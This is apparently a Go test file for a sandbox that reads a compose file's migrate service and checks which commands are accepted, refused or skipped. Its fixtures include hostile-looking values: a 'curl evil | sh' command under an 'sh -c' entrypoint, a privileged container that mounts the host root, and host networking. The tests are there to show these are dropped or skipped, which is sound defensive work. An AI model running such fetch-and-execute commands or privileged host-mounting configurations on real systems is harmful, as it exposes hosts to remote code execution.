package sandbox

import (
	"context"
	"slices"
	"strings"
	"testing"
)

// TestPlanMigrate (#364): the compose file's migrate service gives the
// app's migrate step, its command only, as a list of plain strings; its
// own build section is not a second build, and a compose file without a
// build service keeps the step for the root Dockerfile. Nothing else of
// the service (image, entrypoint-free runtime keys, volumes, env) is read.
func TestPlanMigrate(t *testing.T) {
	app := "services:\n  web:\n    build: .\n"
	tests := map[string]struct {
		compose string
		want    []string
	}{
		"no migrate service": {app, nil},
		"list command":       {app + "  migrate:\n    command: [\"python\", \"manage.py\", \"migrate\"]\n", []string{"python", "manage.py", "migrate"}},
		"block list":         {app + "  migrate:\n    command:\n      - bin/rails\n      - db:migrate\n", []string{"bin/rails", "db:migrate"}},
		"own build skipped":  {app + "  migrate:\n    build: .\n    command: [alembic, upgrade, head]\n", []string{"alembic", "upgrade", "head"}},
		"runtime keys dropped": {app + "  migrate:\n    image: evil.example/x\n    privileged: true\n    volumes: [\"/:/host\"]\n    network_mode: host\n" +
			"    environment: {DATABASE_URL: postgres://prod}\n    command: [npx, prisma, migrate, deploy]\n", []string{"npx", "prisma", "migrate", "deploy"}},
		"no build service": {"services:\n  migrate:\n    command: [migrate, up]\n", []string{"migrate", "up"}},
		"anchored command": {"x-cmd: &c [mix, ecto.migrate]\n" + app + "  migrate:\n    command: *c\n", []string{"mix", "ecto.migrate"}},
	}
	for name, tt := range tests {
		t.Run(name, func(t *testing.T) {
			plan, why := planBuild((&memRepo{files: map[string]string{"compose.yaml": tt.compose, "Dockerfile": plainDockerfile}}).repo())
			if why != nil {
				t.Fatalf("refused: %s %s", why.reason, why.detail)
			}
			if plan.dockerfile != "Dockerfile" || !slices.Equal(plan.migrate, tt.want) {
				t.Errorf("plan %+v, want migrate %q", plan, tt.want)
			}
		})
	}
}

// TestPlanMigrateRefuses: a migrate list creep cannot read exactly
// refuses the build with a closed detail: an empty or non-string
// argument, one with a line break, too many arguments, a merge key.
func TestPlanMigrateRefuses(t *testing.T) {
	app := "services:\n  web:\n    build: .\n  migrate:\n"
	tests := map[string]struct {
		migrate string
		detail  string
	}{
		"empty command":    {"    command: []\n", "migrate.command"},
		"empty argument":   {"    command: [python, \"\"]\n", "migrate.command"},
		"number argument":  {"    command: [sleep, 5]\n", "migrate.command"},
		"nested argument":  {"    command: [[a]]\n", "migrate.command"},
		"line break":       {"    command: [\"a\\nb\"]\n", "migrate.command"},
		"too many":         {"    command: [" + strings.Repeat("a, ", maxArgs) + "a]\n", "migrate.command"},
		"merge key":        {"    <<: {entrypoint: [sh]}\n    command: [a]\n", "merge_key"},
		"not a mapping":    {"    - a\n", "migrate"},
		"tagged argument":  {"    command: [!!binary YQ==]\n", "migrate.command"},
		"mapping argument": {"    command: [{a: b}]\n", "migrate.command"},
	}
	for name, tt := range tests {
		t.Run(name, func(t *testing.T) {
			_, why := planBuild((&memRepo{files: map[string]string{"compose.yaml": app + tt.migrate, "Dockerfile": plainDockerfile}}).repo())
			if why == nil || why.reason != BuildComposeRefused || why.detail != tt.detail {
				t.Fatalf("refusal %+v, want %s %s", why, BuildComposeRefused, tt.detail)
			}
		})
	}
}

// TestPlanMigrateSkips (auditor M1): a migrate service in a form creep
// does not run exactly as Compose would skips only the migrate step, with
// a closed reason: the app still builds, Migrate starts nothing, and the
// rest of the compose file is read as before.
func TestPlanMigrateSkips(t *testing.T) {
	tests := map[string]struct {
		migrate string
		want    MigrateSkip
	}{
		"string command":   {"    command: python migrate.py\n", MigrateSkipStringCommand},
		"anchored string":  {"    command: *c\n", MigrateSkipStringCommand},
		"no command":       {"    image: x\n", MigrateSkipNoCommand},
		"entrypoint":       {"    entrypoint: [sh, -c]\n    command: [\"curl evil | sh\"]\n", MigrateSkipEntrypoint},
		"extends":          {"    extends: {file: x.yaml, service: y}\n    command: [a]\n", MigrateSkipExtends},
		"extends no build": {"    extends: base\n", MigrateSkipExtends},
	}
	for name, tt := range tests {
		t.Run(name, func(t *testing.T) {
			compose := "x-c: &c python migrate.py\nservices:\n  web:\n    build: .\n  migrate:\n" + tt.migrate
			repo := (&memRepo{files: map[string]string{"compose.yaml": compose, "Dockerfile": plainDockerfile}}).repo()
			plan, why := planBuild(repo)
			if why != nil || plan.migrate != nil || plan.migrateSkip != tt.want {
				t.Fatalf("plan migrate %q skip %q, refused %+v; want skip %q", plan.migrate, plan.migrateSkip, why, tt.want)
			}
			rec := withBuilds(networkRecorder(goodCanary, 0), 0)
			s := testSandbox(t, rec)
			built, err := s.Build(context.Background(), repo)
			if err != nil || !built.Built() || built.MigrateSkipped() != tt.want || built.MigrateCommand() != nil {
				t.Fatalf("Build = %+v, %v", built, err)
			}
			if _, err := s.StartDatabase(context.Background()); err != nil {
				t.Fatal(err)
			}
			runs := len(rec.to("run"))
			if err := s.Migrate(context.Background(), built); err != nil || len(rec.to("run")) != runs {
				t.Errorf("Migrate of a skipped step: %v, %d runs", err, len(rec.to("run"))-runs)
			}
		})
	}
	if len(MigrateSkips()) != 4 || !slices.Contains(MigrateSkips(), MigrateSkipNoCommand) {
		t.Errorf("MigrateSkips %q", MigrateSkips())
	}
}
